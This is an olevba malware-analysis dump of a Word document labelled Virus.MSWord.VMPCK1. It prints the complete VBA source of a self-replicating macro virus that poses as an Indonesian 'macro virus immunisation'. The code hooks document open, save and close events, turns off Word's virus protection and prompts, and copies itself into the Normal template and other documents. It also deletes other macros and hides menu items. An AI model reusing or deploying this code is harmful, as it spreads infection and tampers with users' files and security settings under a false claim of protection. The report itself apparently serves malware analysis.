olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.VMPCK1.cm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.VMPCK1.cm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Imunisasi2_Macro.bas 
in file: ./Virus.MSWord.VMPCK1.cm - OLE stream: 'Macros/VBA/Imunisasi2_Macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, NT As Object
Sub AutoOpen()
    On Error GoTo hapus
Dim NT As Object
Dockenor
Create_Loader
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "Imunisasi2_Macro" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Imunisasi2_Macro" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("Imunisasi2_Macro").CodeModule.CountOfLines
NT.Save
Doc.VBProject.VBComponents("Imunisasi2_Macro").Export Pad + ("\Imun.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Imunisasi2_Macro
Label_Exit:
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
If NormInstall = True Then Call Create_Loader
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
hapus:
Dockenor
End Sub
Sub Create_Loader()
On Error Resume Next
Options.DefaultFilePath(wdStartupPath) = "C:\Windows"
Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\inf"
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\Imun.dot")
If MyFile = "" Then
Set aDoc = NormalTemplate.OpenAsDocument
With aDoc
    .SaveAs FileName:=Pad1 + "\Imun.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub Imunisasi2_Macro()
On Error Resume Next
Norkedoc
Call Create_Loader
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = True
bodo:
End Sub
Sub FileSave()
    On Error Resume Next
    Norkedoc
    ActiveDocument.Save
    Imunisasi2_Macro
End Sub
Sub FileClose()
    On Error Resume Next
    Norkedoc
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Imunisasi2_Macro
ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Norkedoc
    Imunisasi2_Macro
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileExit()
    On Error Resume Next
    Norkedoc
    Imunisasi2_Macro
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Norkedoc
    Imunisasi2_Macro
End Sub
Sub AutoClose()
    On Error Resume Next
    Norkedoc
    Imunisasi2_Macro
End Sub
Sub Dihentikan_sementara()

 Sub AutoExec()
 On Error GoTo hapus
 Norkedoc
 Call sim
 Imunisasi2_Macro
 WBF
 AddIns.Unload False
 WBF
hapus:
 Dockenor
 End Sub

 Sub ToolsMacro()
     On Error Resume Next
     Imunisasi2_Macro
 Call Pesan_IT
 End Sub
 Sub FileTemplates()
     On Error Resume Next
     Imunisasi2_Macro
 Call Pesan_IT
 End Sub

 Sub ViewVBCode()
     On Error Resume Next
     Imunisasi2_Macro
 Call Pesan_IT
 End Sub


Sub FileOpen()
On Error Resume Next
WBT
If Dialogs(80).Show <> 0 Then
Dockenor
Norkedoc
Call Imunisasi2_Macro
WBF
Else
WBF
End If
End Sub
Sub Pesan_IT()
msg1 = "Selamat! Dokumen anda telah dilindungi oleh Imunisasi Virus Macro"
msg2 = "Semua dokumen yang telah terkontaminasi dapat segera anda buka"
msg3 = "untuk diberi imunisasi virus macro."
msg4 = "(ACCESS DENIED FOR CHANGES MACRO VIRUSES)"
MsgBox (msg1 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4), vbInformation, "Full Protected by IT"
End Sub
Function Dockenor()
    On Error GoTo Erw1
    Norok = False
    WBT
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      NMacr = NormalTemplate.VBProject.VBComponents(i).Name
      If NMacr = "Imunisasi2_Macro" Then Norok = True
      If (NMacr <> "Imunisasi2_Macro") And (NMacr <> "ThisDocument") Then
      MsgBox ("Normal template anda terkena Virus Macro = " + NMacr + Chr(13) + "Virus Makro akan dihapus dan tunggu Sejenak"), vbInformation, "Full Protected by IT"
  Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems

      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:= _
          "Imunisasi2_Macro", Object:=wdOrganizerObjectProjectItems
      Templates(NormalTemplate.FullName).Save
      NormalTemplate.Application.Visible = False
Erh1:
    End If
Erw1:
End Function
Function Norkedoc()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "Imunisasi2_Macro" Then Dokok = True
      If (NMacr <> "Imunisasi2_Macro") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       MsgBox ("Dokumen anda terkena Virus Macro = " + NMacr + Chr(13) + "Click OK untuk membersihkannya."), vbInformation, "Full Protected by IT"
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "Imunisasi2_Macro", Object:=wdOrganizerObjectProjectItems
      ActiveDocument.ReadOnlyRecommended = False
      ActiveDocument.Save
Erh2:
    End If
Erw2:
End Function
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
Function sim()
f56879025 = GetAttr(NormalTemplate.FullName)
Application.VBE.ActiveVBProject.VBComponents("Imunisasi2_Macro").Export "c:\windows\system\vxd.sys"
If f56879025 = vbReadOnly Then GoTo bodo
If f56879025 = vbReadOnly + vbArchive Then GoTo bodo
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Imunisasi2_Macro" Then xxx902578112 = True
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Imunisasi2_Macro" Then mmf78116 = True
Next i
If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
o7811902511.Import "c:\windows\system\vxd.sys"
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
bodo:
End Function







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

